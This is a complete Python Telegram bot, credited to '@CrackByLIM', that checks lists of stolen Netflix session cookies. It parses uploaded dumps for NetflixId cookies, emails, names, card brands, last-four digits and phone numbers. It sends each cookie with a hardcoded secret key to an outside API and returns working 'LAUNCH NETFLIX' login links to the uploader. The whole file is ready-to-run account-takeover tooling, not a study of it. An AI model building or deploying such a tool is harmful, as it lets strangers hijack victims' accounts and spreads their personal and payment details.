import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# Configuration
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"
SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== UNIVERSAL MULTI-LANGUAGE PARSER ====================
# Works with ANY language (English, Spanish, Portuguese, Japanese, etc.)
# Works with ANY format (emoji, text, JSON, CSV, etc.)

def detect_account_separator(content):
    """Automatically detect how accounts are separated in the file"""
    # Common separators
    separators = [
        '----------------------------------------',
        '════════════════════════════════════════',
        '────────────────────────────────────────',
        '==========',
        '------',
        '\n\n\n',  # Multiple newlines
        '\r\n\r\n',
    ]
    
    for sep in separators:
        if sep in content:
            return sep
    
    # If no separator found, try to detect by "PREMIUM ACCOUNT" or similar patterns
    lines = content.split('\n')
    account_starts = []
    
    patterns = [
        r'PREMIUM ACCOUNT',
        r'ACCOUNT #\d+',
        r'Account #\d+',
        r'Cuenta #\d+',
        r'Conta #\d+',
        r'アカウント #\d+',
    ]
    
    for i, line in enumerate(lines):
        for pattern in patterns:
            if re.search(pattern, line, re.IGNORECASE):
                account_starts.append(i)
                break
    
    if len(account_starts) > 1:
        # Use the line numbers to determine separator
        return 'LINE_BASED'
    
    return None

def extract_accounts(content):
    """Extract individual accounts from file content using smart detection"""
    # Try to detect separator
    separator = detect_account_separator(content)
    
    if separator and separator != 'LINE_BASED':
        # Split by the detected separator
        raw_accounts = content.split(separator)
        accounts = [acc.strip() for acc in raw_accounts if acc.strip() and len(acc.strip()) > 50]
        return accounts
    
    elif separator == 'LINE_BASED':
        # Use line-based detection with account headers
        lines = content.split('\n')
        accounts = []
        current_account = []
        in_account = False
        
        for line in lines:
            # Check if this line starts a new account
            is_new_account = any([
                re.search(r'PREMIUM ACCOUNT', line, re.IGNORECASE),
                re.search(r'ACCOUNT #\d+', line, re.IGNORECASE),
                re.search(r'Account #\d+', line, re.IGNORECASE),
                re.search(r'Cuenta #\d+', line, re.IGNORECASE),
                re.search(r'Conta #\d+', line, re.IGNORECASE),
                'Direct Login URL' in line,
                'NetflixId=' in line and not current_account,
            ])
            
            if is_new_account and current_account:
                # Save previous account
                accounts.append('\n'.join(current_account))
                current_account = [line]
            elif is_new_account:
                current_account = [line]
            elif current_account:
                current_account.append(line)
        
        # Add the last account
        if current_account:
            accounts.append('\n'.join(current_account))
        
        return accounts
    
    else:
        # No clear separator, try to find NetflixId patterns
        lines = content.split('\n')
        accounts = []
        current_account = []
        
        for line in lines:
            if 'NetflixId=' in line and not current_account:
                current_account = [line]
            elif 'NetflixId=' in line and current_account:
                accounts.append('\n'.join(current_account))
                current_account = [line]
            elif current_account:
                current_account.append(line)
        
        if current_account:
            accounts.append('\n'.join(current_account))
        
        return accounts

def parse_account(account_text):
    """Parse a single account (multi-line) in ANY language"""
    try:
        account = {}
        
        # STEP 1: Find NetflixId (THIS IS THE MOST IMPORTANT)
        netflix_id_match = re.search(r'NetflixId=([^&\s\'"]+)', account_text)
        if netflix_id_match:
            account['netflix_id'] = netflix_id_match.group(1).strip()
            logger.info(f"✅ Found NetflixId: {account['netflix_id'][:30]}...")
        else:
            return None
        
        # STEP 2: Find Email in ANY language (look for @ symbol)
        email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', account_text)
        if email_match:
            account['email'] = email_match.group(1).strip()
        else:
            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
        
        # STEP 3: Find Direct Login URL (if present)
        url_match = re.search(r'(https?://[^\s]+nftoken=[^\s]+)', account_text)
        if url_match:
            account['direct_url'] = url_match.group(1).strip()
            logger.info(f"✅ Found direct URL")
        
        # STEP 4: Find fields in ANY language using flexible patterns
        field_patterns = {
            'name': [
                r'Name[:\s]*([^\n]+)',
                r'Nombre[:\s]*([^\n]+)',
                r'Nome[:\s]*([^\n]+)',
                r'名前[:\s]*([^\n]+)',
                r'氏名[:\s]*([^\n]+)',
                r'馃懁 Name[:\s]*([^\n]+)',
            ],
            'country': [
                r'Country[:\s]*([^\n]+)',
                r'País[:\s]*([^\n]+)',
                r'Pais[:\s]*([^\n]+)',
                r'国[:\s]*([^\n]+)',
                r'馃實 Country[:\s]*([^\n]+)',
            ],
            'plan': [
                r'Plan[:\s]*([^\n]+)',
                r'Plano[:\s]*([^\n]+)',
                r'プラン[:\s]*([^\n]+)',
                r'馃搵 Plan[:\s]*([^\n]+)',
            ],
            'quality': [
                r'Video Quality[:\s]*([^\n]+)',
                r'Qualidade[:\s]*([^\n]+)',
                r'画質[:\s]*([^\n]+)',
                r'馃帴 Video Quality[:\s]*([^\n]+)',
            ],
            'max_streams': [
                r'Max Streams[:\s]*([^\n]+)',
                r'Máx. de streams[:\s]*([^\n]+)',
                r'同時視聴[:\s]*([^\n]+)',
                r'馃摵 Max Streams[:\s]*([^\n]+)',
            ],
            'price': [
                r'Price[:\s]*([^\n]+)',
                r'Precio[:\s]*([^\n]+)',
                r'Preço[:\s]*([^\n]+)',
                r'料金[:\s]*([^\n]+)',
                r'馃挵 Price[:\s]*([^\n]+)',
            ],
            'member_since': [
                r'Member Since[:\s]*([^\n]+)',
                r'Miembro desde[:\s]*([^\n]+)',
                r'Membro desde[:\s]*([^\n]+)',
                r'入会日[:\s]*([^\n]+)',
                r'馃搮 Member Since[:\s]*([^\n]+)',
            ],
            'next_billing': [
                r'Next Billing Date[:\s]*([^\n]+)',
                r'Próxima facturación[:\s]*([^\n]+)',
                r'Próximo pagamento[:\s]*([^\n]+)',
                r'次回請求日[:\s]*([^\n]+)',
                r'馃搮 Next Billing Date[:\s]*([^\n]+)',
            ],
            'payment_method': [
                r'Payment Method[:\s]*([^\n]+)',
                r'Método de pago[:\s]*([^\n]+)',
                r'Método de pagamento[:\s]*([^\n]+)',
                r'支払い方法[:\s]*([^\n]+)',
                r'馃挸 Payment Method[:\s]*([^\n]+)',
            ],
            'card_brand': [
                r'Card Brand[:\s]*([^\n]+)',
                r'Marca de tarjeta[:\s]*([^\n]+)',
                r'Bandeira do cartão[:\s]*([^\n]+)',
                r'カードブランド[:\s]*([^\n]+)',
                r'馃彟 Card Brand[:\s]*([^\n]+)',
            ],
            'last4': [
                r'Last 4 Digits[:\s]*([^\n]+)',
                r'Últimos 4 dígitos[:\s]*([^\n]+)',
                r'Últimos 4 dígitos[:\s]*([^\n]+)',
                r'下4桁[:\s]*([^\n]+)',
                r'馃敘 Last 4 Digits[:\s]*([^\n]+)',
            ],
            'phone': [
                r'Phone[:\s]*([^\n]+)',
                r'Teléfono[:\s]*([^\n]+)',
                r'Telefone[:\s]*([^\n]+)',
                r'電話番号[:\s]*([^\n]+)',
                r'馃摓 Phone[:\s]*([^\n]+)',
            ],
        }
        
        for key, patterns in field_patterns.items():
            for pattern in patterns:
                match = re.search(pattern, account_text, re.IGNORECASE)
                if match:
                    account[key] = match.group(1).strip()
                    break
        
        return account
        
    except Exception as e:
        logger.error(f"Error parsing account: {e}")
        return None

# ==================== API FUNCTIONS ====================

async def check_netflix_id(netflix_id, email, account_data=None):
    """Check if Netflix ID is valid by calling the API"""
    
    # If account already has a direct URL from the file, use it without API call
    if account_data and account_data.get('direct_url'):
        logger.info(f"✅ Using pre-validated URL for {email}")
        return {
            "success": True,
            "login_url": account_data['direct_url'],
            "email": email,
            "data": {"pre_validated": True}
        }
    
    # If no netflix_id, can't check
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "email": email
        }
    
    # Otherwise, call the API as normal
    try:
        url = f"{API_URL}/api/gen"
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"Checking Netflix ID for {email}")
        
        response = requests.post(url, json=data, timeout=10)
        
        try:
            result = response.json()
        except:
            return {
                "success": False, 
                "error": "Invalid JSON response",
                "email": email
            }
        
        if result.get('success') == True:
            return {
                "success": True,
                "login_url": result.get('login_url'),
                "email": email,
                "data": result
            }
        else:
            return {
                "success": False,
                "error": result.get('error', 'Unknown error'),
                "error_code": result.get('error_code', 'UNKNOWN_ERROR'),
                "email": email
            }
                
    except Exception as e:
        return {
            "success": False, 
            "error": str(e),
            "email": email
        }

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with premium formatting"""
    user = update.effective_user
    
    welcome = f"""
╔════════════════════════════════════════╗
║     🎬 NETFLIX ACCOUNT CHECKER PRO 🎬  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 **Hello {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send me a .txt file** with Netflix accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌍 **Works with ANY language!**
🇺🇸 English | 🇪🇸 Spanish | 🇧🇷 Portuguese | 🇯🇵 Japanese | 🇮🇳 Hindi | 🇫🇷 French | 🇩🇪 German | 🇨🇳 Chinese

📋 **Any format works!** I'll automatically:
✅ Detect account separators automatically
✅ Extract Netflix ID from ANY format
✅ Support multi-line accounts
✅ Work with emojis and special characters
✅ Check validity with official API
✅ Send premium login links

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
╔════════════════════════════════════════╗
║           🆘 HELP CENTER 🆘            ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • ANY language is accepted!
   • ANY format works!
   • Just make sure it contains `NetflixId=...`

2️⃣ **Send the file to me**
   • I'll automatically detect accounts
   • Process each account
   • Only valid accounts will be sent

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 **SUPPORTED LANGUAGES:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ English (Plan, Name, Country)
✓ Spanish (Plan, Nombre, País)
✓ Portuguese (Plano, Nome, País)
✓ Japanese (プラン, 名前, 国)
✓ French (Forfait, Nom, Pays)
✓ German (Plan, Name, Land)
✓ Italian (Piano, Nome, Paese)
✓ Hindi (योजना, नाम, देश)
✓ Chinese (套餐, 姓名, 国家)
✓ Korean (요금제, 이름, 국가)
✓ Russian (План, Имя, Страна)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **SUPPORTED FORMATS:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Emoji format (馃敼, 馃搧, 馃崻)
✓ Text format (Name:, Country:, Plan:)
✓ JSON format
✓ CSV format
✓ Raw cookie format
✓ Mixed formats

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome
/stats - Statistics
/clear - Clear session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔════════════════════════════════════════╗
║         📊 GLOBAL STATISTICS 📊        ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **Performance Metrics:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Total Checks:** `{total_checks}`
• **✅ Valid Accounts:** `{valid_accounts}`
• **❌ Invalid Accounts:** `{invalid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **System Status:**
• **Bot:** 🟢 ONLINE
• **API:** 🟢 CONNECTED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text(
        f"""
╔════════════════════════════════════════╗
║         ✅ SESSION CLEARED ✅          ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
You can now upload a new file.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )

# ==================== FILE HANDLER WITH UNIVERSAL SUPPORT ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files - supports ANY language and format"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts, invalid_accounts
    
    # Check rate limit
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"""
╔════════════════════════════════════════╗
║         ⏰ RATE LIMIT EXCEEDED         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Please wait a minute before trying again.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"""
╔════════════════════════════════════════╗
║         ❌ INVALID FILE TYPE           ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Please upload a `.txt` file.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    # Send initial message
    status_msg = await update.message.reply_text(
        f"""
╔════════════════════════════════════════╗
║        📥 FILE RECEIVED 📥             ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
⏳ **Status:** Downloading...

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Extract accounts using smart detection
        accounts = extract_accounts(content)
        
        if not accounts:
            await status_msg.edit_text(
                f"""
╔════════════════════════════════════════╗
║        ❌ NO ACCOUNTS FOUND ❌         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No accounts with NetflixId= were found.

💡 **Make sure your file contains NetflixId=**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """,
                parse_mode='Markdown'
            )
            return
        
        await status_msg.edit_text(
            f"""
╔════════════════════════════════════════╗
║         📊 ANALYZING FILE 📊           ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
📝 **Found:** `{len(accounts)}` accounts

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔄 **Processing each account...**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        
        # Process each account
        valid_count = 0
        invalid_count = 0
        valid_accounts_found = []
        
        for i, account_block in enumerate(accounts, 1):
            # Parse the account (multi-language support)
            account = parse_account(account_block)
            
            if not account:
                invalid_count += 1
                continue
            
            # Calculate progress
            progress = i / len(accounts)
            bar_length = 15
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # Update progress
            if i % 1 == 0 or i == len(accounts):
                await status_msg.edit_text(
                    f"""
╔════════════════════════════════════════╗
║        🔄 PROCESSING ACCOUNTS 🔄       ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **Progress:** `{i}/{len(accounts)}`
📈 **Complete:** `{progress*100:.1f}%`
`{bar}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Valid Found:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """,
                    parse_mode='Markdown'
                )
            
            # Check with API
            email = account.get('email', f"user_{account['netflix_id'][:8]}@unknown.com")
            result = await check_netflix_id(account['netflix_id'], email, account)
            
            # Update global stats
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Store valid account
                valid_accounts_found.append({
                    'email': email,
                    'password': account.get('password', 'N/A'),
                    'login_url': result['login_url'],
                    'country': account.get('country', 'N/A'),
                    'plan': account.get('plan', 'N/A'),
                    'quality': account.get('quality', 'N/A'),
                    'streams': account.get('max_streams', 'N/A'),
                    'name': account.get('name', 'N/A'),
                    'direct_url': account.get('direct_url', None)
                })
            else:
                invalid_count += 1
                invalid_accounts += 1
            
            # Small delay to avoid rate limits
            await asyncio.sleep(0.5)
        
        # COMPLETION SCREEN
        success_rate = valid_count/len(accounts)*100 if len(accounts) > 0 else 0
        
        completion_text = f"""
╔════════════════════════════════════════╗
║        ✅ PROCESSING COMPLETE ✅       ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **RESULTS SUMMARY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **File:** `{document.file_name}`
📝 **Total Accounts:** `{len(accounts)}`
✅ **Valid Accounts:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`
📈 **Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Sending {valid_count} valid account(s)...**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        await status_msg.edit_text(completion_text, parse_mode='Markdown')
        
        # Send ALL valid accounts
        if valid_accounts_found:
            for idx, acc in enumerate(valid_accounts_found, 1):
                premium_msg = f"""
╔════════════════════════════════════════╗
║     ✅ VALID ACCOUNT #{idx}/{valid_count} ✅     ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 **ACCOUNT DETAILS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Email:** `{acc['email']}`
• **Name:** `{acc.get('name', 'N/A')}`
• **Country:** `{acc.get('country', 'N/A')}`
• **Plan:** `{acc.get('plan', 'N/A')}`
• **Quality:** `{acc.get('quality', 'N/A')}`
• **Max Streams:** `{acc.get('streams', 'N/A')}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **LOGIN LINK**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`{acc['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Link expires - use it now!*

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                
                await update.message.reply_text(
                    premium_msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
            
            # Final summary
            final_summary = f"""
╔════════════════════════════════════════╗
║        📬 ALL ACCOUNTS SENT 📬         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Successfully sent {valid_count} valid account(s)**

💡 **Check messages above for login links**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            await update.message.reply_text(final_summary, parse_mode='Markdown')
            
        else:
            # No valid accounts found
            await update.message.reply_text(
                f"""
╔════════════════════════════════════════╗
║        ❌ NO VALID ACCOUNTS ❌         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No valid accounts were found in your file.

💡 **Suggestions:**
• Make sure file contains NetflixId=
• Get fresh Netflix cookies
• Try again later

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """,
                parse_mode='Markdown'
            )
        
        # Store in session
        user_sessions[user_id] = {
            'last_file': document.file_name,
            'valid': valid_count,
            'invalid': invalid_count,
            'total': valid_count + invalid_count
        }
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await status_msg.edit_text(
            f"""
╔════════════════════════════════════════╗
║           ❌ ERROR ❌                  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
❌ **Error:** `{str(e)[:100]}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Please try again or check file format

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 PROFESSIONAL NETFLIX ACCOUNT CHECKER")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ API URL: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is starting...")
    print("🌍 Universal Multi-Language Parser Enabled")
    print("📝 Supports: English, Spanish, Portuguese, Japanese, and more!")
    print("=" * 60)
    
    # Create application with custom settings
    app = (
        Application.builder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .write_timeout(30)
        .pool_timeout(30)
        .build()
    )
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    # Initialize and start
    try:
        await app.initialize()
        await app.start()
        await app.updater.start_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        print("✅ Bot started successfully!")
        print("=" * 60)
        print("🤖 Bot is now running! Waiting for files...")
        print("=" * 60)
        
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Error in bot: {e}")
        raise e
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        try:
            clear_telegram_webhook()
        except:
            pass

if __name__ == '__main__':
    main()
